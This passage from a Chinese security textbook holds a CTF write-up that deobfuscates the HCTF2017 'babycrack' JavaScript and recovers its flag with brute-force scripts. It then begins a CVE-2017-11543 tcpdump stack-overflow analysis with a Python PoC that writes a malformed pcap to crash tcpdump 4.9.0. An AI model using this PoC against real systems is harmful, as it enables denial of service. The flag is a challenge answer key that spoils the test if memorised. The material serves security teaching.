6.3.1 web HCTF2017 babycrack
6.3.1 web HCTF2017 babycrack
题目解析
解题流程
下载文件
题目解析
题目就不用多说了，很容易发现是 JavaScript 代码审计。
整个文件的变量名/函数名可以看作是混淆了的，分析一下整个文件的结构：
——
|- _0x180a,关键字的替换数组
|- 匿名函数,对数组元素进行重排
|- _0xa180,取出对应索引的数组元素
|- check,主要的分析函数
|- test,主要的运行函数
这道题结合浏览器进行动态调试，可以节省很多脑力。
首先是重排，这里不需要去深究到底逻辑原理，让引擎代替你去把数组重排好即
可。结合程序员计算器和 CyberChef 分析更加方便。
解题流程
这样我们可以直接进入 check 函数进行分析。
1490
6.3.1 web HCTF2017 babycrack
——
|- _0x2e2f8d,又一次进行数组混淆，得到一个新数组
|- _0x50559f,获取 flag 的前四位，即 ‘hctf’
|- _0x5cea12,由 ‘hctf’ 生成一个基数
|- 这里有一个 debug 的事件，个人认为是阻止使用 F12 调试用的，所以可以直接
删去
|- 匿名函数，对 _0x2e2f8d 这个数组再进行排列
|- _0x43c8d1,根据输入获取数组中相应值的函数
|- _0x1c3854,将输入的 ascii 码转化为 16 进制，再加上 ‘0x’
以上部分可以看成是准备部分，这一部分的难点在于多次处理了数组，在动态调试
时，很多函数如果多次执行就会产生与原答案不同的数组结构，因此，每次执行都
需要重新初始化。
——
|- _0x76e1e8,以下划线分割输入,从后面分析可以得知 flag 一共有 5 段
|- _0x34f55b,这一段给出了第一个逆向的条件，结合下一句 if 条件。
单独来分析，其实最初我看掉了一个括号，结果弄混了符号优先级，导致觉得这个
条件没有意义。
这个条件是说，第一段的最后两个字符的 16 进制和 ‘{’ 的 16 进制异或后，对第一
段的长度求余应该等于 5 。
这里可以先进行如下猜测
第一段，已经有 ‘hctf{’ 了，这里正好去最后两位，先猜测第一段一共只有 7 位，这
个猜测是后验的，先不细说。
——
|- b2c
理解这个函数极为重要，通过随机输入进行测试，输出结果有些眼熟，像是
base64 但不对，比对后确定是 base32 编码，知道这个就不用再去多解读它了。同
时，这里也有一个 debug 需要删除
1491
6.3.1 web HCTF2017 babycrack
——
|- e，第二个逆向条件
这一句是说，第三段做 base32 编码，取等号前的部分，再进行 16 进制和
0x53a3f32 异或等于 0x4b7c0a73
计算 0x4b7c0a73^0x53a3f32=0x​4E463541​
​4E463541 => NF5A 16 进制转字符
NF5A => iz base32 解码
因此，flag 暂时如下 hctf{x_x_iz_x_x}
——
|- f，第三个逆向条件
这一句是说，第四段和第三段一样编码后，和 0x4b7c0a73 异或等于 0x4315332
计算 0x4315332^0x4b7c0a73=0x​4F4D5941
4F4D5941 => OMYA
OMYA => s0
flag hctf{x_x_iz_s0_x}
——
|- n，f*e*第一段的长度（先不管）
|- h，将输入字符串的每一个字符 ascii 码进行计算（*第二段长度）
后连接起来显示（字符到 ascii 码转换）
|- j，将第二段以 ‘3’ 分割，又后面可以确定是分成了两部分
|- 第四个逆向条件
首先是，分割的两部份长度相等，第一部分和第二部分 16 进制异或等于 0x1613
，这个条件只能后验，也先不管。
1492
6.3.1 web HCTF2017 babycrack
——
|- k，输入的 ascii 码*第二段的长度
|- l，第一部分逐字符 ascii 码*第二段长度等于 0x2f9b5072
首先，0x2f9b5072 == 798707826​
798 707 826
正好分成三个，已知h是对应 ascii 码*常数，
所以假设第一部分有三个字符，那么就是变成了求解常数
也就是 798 707 826 的最大公约数
求解得常数为 7
字符 114 101 118 => rev
所以，第二段一共有 7 个字符,前四个字符为 rev3，带入上面的后验条件 0x1613
0x726576^0x1613=0x​727365
727365 => rse
flag hctf{?_rev3rse_iz_s0_?}
——
|- m,第五个逆向条件，第五段的前四位和第一段的长度有关
题目的 hint 提示，每一段都有意义，因此我们这里做个爆破，假设第一段的长度在
6-30 之间，我们可以算出 n，在用 n 去算第五段前四位。
n = f*e*(6-30)
第五段前四位 = n % 0x2f9b5072 + 0x48a05362
代码：
1493
6.3.1 web HCTF2017 babycrack
import binascii
for i in range(6,31):
n = 0x4315332*0x4b7c0a73*i
strings = n%0x2f9b5072 + 0x48a05362
print binascii.a2b_hex(str(hex(strings))[2:-1])
从结果中可以看到大多数字符都没有意义，除了 h4r 让人遐想联翩，可惜还是不
全，但是结合已经分析出的 flag，猜测应该是 h4rd。
flag hctf{??_rev3rse_iz_s0_h4rd?}
——
|- _0x5a6d56,将输入重复指定次数组合
|- 第六个逆向条件和第七个逆向条件
1. 第五段的第六位重复两次不等于倒数第 5-8 位，这个条件也让人摸不着头脑。
2. 第五段倒数第 2 位等于第五段第五位加 1
3. 第五段第 7-8 位去掉 0x 等于第五段第 7 位的 ascii 码*第五段长度*5
4. 第五段第五位为 2，第五段 7-8 位等于第五段第 8 位重复两次
5. 结合 hint
由以上条件可以推出以下 flag
hctf{??_rev3ser_iz_s0_h4rd2?3??3333}
先假设 2 和 3 之间没有数字了，这时 7-8 位还未知但是 7-8 位相同，这时的方程
而且在这里，由于直接把 0x 去掉，所以 x 的 16 进制一定全为数字
字符拼接 {hex(x)hex(x)} = ascii(x)*13*5
爆破代码：
1494
6.3.1 web HCTF2017 babycrack
import binascii
for i in range(1,128):
string1 = hex(i)[2:]
try:
if int(string1+string1) == i*13*5:
print chr(i)
except:
continue
output：
e
验证前面的后验条件可以确定如下 flag
hctf{??_rev3ser_iz_s0_h4rd23ee3333}
只剩下最前面的两位，为了方便，利用题目提供的 sha256 结果，我就不回溯条件
在判断，直接进行碰撞。
1495
6.3.1 web HCTF2017 babycrack
import hashlib
a = 'hctf{'
b = '_rev3rse_iz_s0_h4rd23ee3333}'
e1 = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e'
,'f','g','h','i','j','k',
'l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
e2 = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e'
,'f','g','h','i','j','k',
'l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
for i in e1:
for j in e2:
sh = hashlib.sha256()
sh.update(a+i+j+b)
if sh.hexdigest() == "d3f154b641251e319855a73b010309a168
a12927f3873c97d2e5163ea5cbb443":
print a+i+j+b
output:
hctf{j5_rev3rse_iz_s0_h4rd23ee3333}
1496
七、实战篇
第七篇 实战篇
CVE
7.1.1 CVE-2017-11543 tcpdump sliplink_print 栈溢出漏洞
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
7.1.3 CVE-2016-4971 wget 任意文件上传漏洞
7.1.4 CVE-2017-13089 wget skip_short_body 栈溢出漏洞
7.1.5 CVE–2018-1000001 glibc realpath 缓冲区下溢漏洞
7.1.6 CVE-2017-9430 DNSTracer 栈溢出漏洞
7.1.7 CVE-2018-6323 GNU binutils elf_object_p 整型溢出漏洞
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
7.1.9 CVE-2010-3333 Microsoft Word RTF pFragments 栈溢出漏洞
Malware
1497
7.1.1 CVE-2017-11543 tcpdump sliplink_print 栈溢出漏洞
7.1.1 CVE-2017-11543 tcpdump
sliplink_print 栈溢出漏洞
漏洞描述
漏洞复现
漏洞分析
参考资料
下载文件
漏洞描述
tcpdump 是 Linux 上一个强大的网络数据采集分析工具，其 4.9.0 版本的
sliplink_print 函数（位于 print-sl.c ）中存在一个栈溢出漏洞，原因是
程序在进行内存存取的操作前未对一些值做判断，导致操作了非法的内存地址。攻
击者可以利用这个漏洞触发拒绝服务，甚至任意代码执行。
这个漏洞是发现者用 AFL 做 fuzz 时发现的。
漏洞复现
推荐使用的环境 备注
操作系统 Ubuntu 16.04 体系结构：32 位
调试器 gdb-peda 版本号：7.11.1
漏洞软件 tcpdump 版本号：4.9.0
为了编译 tcpdump，我们需要安装 dev 版本的 libpcap：
1498
7.1.1 CVE-2017-11543 tcpdump sliplink_print 栈溢出漏洞
$ sudo apt-get install libpcap-dev
$ dpkg -l libpcap-dev
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-a
Wait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name Version Architecture Descriptio
n
+++-===================-==============-==============-==========
==================================
ii libpcap-dev 1.7.4-2 all developmen
t library for libpcap (transitiona
下载安装有漏洞的 tcpdump 4.9.0：
$ wget https://github.com/the-tcpdump-group/tcpdump/archive/tcpd
ump-4.9.0.tar.gz
$ tar zxvf tcpdump-4.9.0.tar.gz
$ cd tcpdump-tcpdump-4.9.0/
$ ./configure
执行 configure 会生成相应的 Makefile，然后 make install 就可以了，但
是这里我们修改下 Makefile，给 gcc 加上参数 -fsanitize=address ，以开启内
存检测功能：
CFLAGS = -g -O2 -fsanitize=address
最后：
$ sudo make install
$ tcpdump --version
tcpdump version 4.9.0
libpcap version 1.7.4
使用下面的 poc 即可成功地触发漏洞产生 Segment Fault：
1499
7.1.1 CVE-2017-11543 tcpdump sliplink_print 栈溢出漏洞
import os
def sigsegv():
buf = "\xd4\xc3\xb2\xa1\x02\x00\x04\x00\x00\x00\x00\x00\x00
\x00\x00\x00"
buf += "\x00\x00\x04\x00\x08\x00\x00\x00\xf6\xb5\xa5X\xf8\xb
d\x07\x00'"
buf += "\x00\x00\x006\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe
7\xe7"
buf += "\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7\xe7
\xe7\xca\x00"
buf += "\x00RT\x00\x125\x02\x08\x00'\xbd\xc8.\x08\x00"
with open("slip-bad-direction.pcap", "wb") as f:
f.write(buf)
f.close()
cmd = 'tcpdump -e -r slip-bad-direction.pcap'
os.system(cmd)
if __name__ == "__main__":
sigsegv()
1500
7.1.1 CVE-2017-11543 tcpdump sliplink_print 栈溢出漏洞
$ python poc.py
reading from file slip-bad-direction.pcap, link-type SLIP (SLIP)
ASAN:SIGSEGV
================================================================
=
==11084==ERROR: AddressSanitizer: SEGV on unknown address 0x0842
5c5c (pc 0x0815f697 bp 0x00000027 sp 0xbfae3ab0 T0)
#0 0x815f696 in compressed_sl_print print-sl.c:253
#1 0x815f696 in sliplink_print print-sl.c:166
#2 0x815f696 in sl_if_print print-sl.c:77
#3 0x8060ecf in pretty_print_packet print.c:339
#4 0x8055328 in print_packet tcpdump.c:2501
#5 0xb7203467 (/usr/lib/i386-linux-gnu/libpcap.so.0.8+0x1c4
67)
#6 0xb71f40e2 in pcap_loop (/usr/lib/i386-linux-gnu/libpcap.
so.0.8+0xd0e2)
#7 0x8051218 in main tcpdump.c:2004
#8 0xb7049636 in __libc_start_main (/lib/i386-linux-gnu/libc
.so.6+0x18636)
#9 0x8054315 (/usr/local/sbin/tcpdump.4.9.0+0x8054315)
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV print-sl.c:253 compressed_sl_pri
nt
==11084==ABORTING
$ file slip-bad-direction.pcap
slip-bad-direction.pcap: tcpdump capture file (little-endian) -
version 2.4 (SLIP, capture length 262144)
漏洞分析
首先介绍一下 pcap 包的文件格式，文件头是这样一个结构体，总共 24 个字节：
1501
7.1.1 CVE-2017-11543 tcpdump sliplink_print 栈溢出漏洞
struct pcap_file_header {
bpf_u_int32 magic;
u_short version_major;
u_short version_minor;
bpf_int32 thiszone; /* gmt to local correction */
bpf_u_int32 sigfigs; /* accuracy of timestamps */
bpf_u_int32 snaplen; /* max length saved portion of e
ach pkt */
bpf_u_int32 linktype; /* data link type (LINKTYPE_*) */
};
magic ：标识位：4 字节，这个标识位的值是 16 进制的 0xa1b2c3d4
major ：主版本号：2 字节，默认值为 0x2
minor ：副版本号：2 字节，默认值为 0x04
thiszone ：区域时间：4 字节，实际上并未使用，因此被设置为 0
sigfigs ：精确时间戳：4 字节，实际上并未使用，因此被设置为 0